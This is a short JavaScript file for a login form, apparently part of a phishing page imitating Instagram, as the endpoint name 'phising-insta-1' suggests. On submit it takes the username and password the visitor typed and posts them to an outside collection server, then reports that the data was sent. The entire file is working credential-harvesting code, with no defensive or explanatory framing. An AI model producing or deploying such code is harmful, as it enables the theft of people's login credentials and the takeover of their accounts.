const form = document.getElementById("loginForm");
const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");

form.addEventListener("submit", async (e) => {
  e.preventDefault(); // ⛔ stop page reload

  const id1 = usernameInput.value.trim();
  const id2 = passwordInput.value.trim();

  if (!id1 || !id2) {
    alert("Please fill both fields");
    return;
  }

  try {
    const res = await fetch("https://phising-insta-1.onrender.com/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ id1, id2 }),
    });

    const data = await res.json();
    console.log("Saved:", data);

    alert("Data sent successfully!");
    form.reset();
  } catch (err) {
    console.error("Request failed:", err);
    alert("Failed to send data");
  }
});
